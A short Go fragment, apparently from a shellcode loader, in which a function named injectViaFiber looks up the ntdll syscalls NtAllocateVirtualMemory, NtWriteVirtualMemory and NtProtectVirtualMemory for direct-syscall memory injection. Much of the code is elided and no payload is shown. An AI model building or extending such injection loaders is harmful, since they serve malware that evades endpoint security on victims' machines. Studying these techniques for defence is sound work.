...
func injectViaFiber(cfg *LoadConfig) *LoadResult {
	...
	if !ok {
		return &LoadResult{Success: false, Message: "NtAllocateVirtualMemory not found in ntdll"}
	}
	sysNtWrite, ok := st.GetSyscall("NtWriteVirtualMemory")
	if !ok {
		return &LoadResult{Success: false, Message: "NtWriteVirtualMemory not found in ntdll"}
	}
	sysNtProtect, ok := st.GetSyscall("NtProtectVirtualMemory")
	if !ok {
		return &LoadResult{Success: false, Message: "NtProtectVirtualMemory not found in ntdll"}
	}
